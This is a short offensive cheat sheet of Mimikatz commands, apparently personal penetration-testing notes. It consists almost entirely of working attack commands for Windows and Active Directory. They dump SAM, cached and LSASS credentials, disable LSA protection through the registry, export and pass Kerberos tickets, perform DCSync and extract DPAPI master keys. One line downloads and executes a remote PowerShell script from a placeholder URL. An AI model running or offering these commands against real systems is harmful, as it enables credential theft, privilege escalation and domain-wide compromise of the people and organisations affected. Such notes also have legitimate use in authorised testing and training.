https://tools.thehacker.recipes/mimikatz
## steps that must be checked
```shell
privilege::debug
token::elevate
```
## credentials
```shell
# disable LSA protection on newer version of Windows and reboot in order to dump lsass memory
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

```shell
lsadump::sam
lsadump::cache
sekurlsa::logonpasswords
```


## tickets
```shell
# export tickets
kerberos::list /export
sekurlsa::tickets /export

# import tickets
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```

## dcsync
```shell
lsadump::dcsync
```
## get DPAPI masterkey
```shell
dpapi::masterkey /in:"C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\<sid>/<masterkey>" /password:"password" /protected

sekurlsa::dpapi
```

## use input parameter
```shell
./mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"         # for evil-winrm ( not an interactive shell)
```

## Invoke-Mimikatz.ps1
```shell
IEX (New-Object System.Net.Webclient).DownloadString('URL/')
Invoke-Mimikatz -DumpCreds # Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```